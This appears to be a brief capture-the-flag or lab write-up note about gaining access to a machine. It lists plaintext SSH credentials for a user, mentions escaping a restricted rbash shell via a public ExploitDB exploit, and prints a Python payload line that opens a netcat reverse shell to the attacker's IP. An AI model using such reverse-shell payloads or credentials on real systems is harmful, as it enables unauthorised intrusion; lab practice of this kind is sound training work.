We have mindy's SSH credentials
`mindy:P@55W0rd1!2@`

SSH'd into the system as user Mindy but it is spawning an rbash shell

Using the public exploit on [ExploitDB](https://www.exploit-db.com/exploits/50347), got a reverse shell on port 443

Select payload:
```py
payload = 'nc -e /bin/sh ' + local_ip + ' ' + port
```

![[Pasted image 20240901121000.png]]

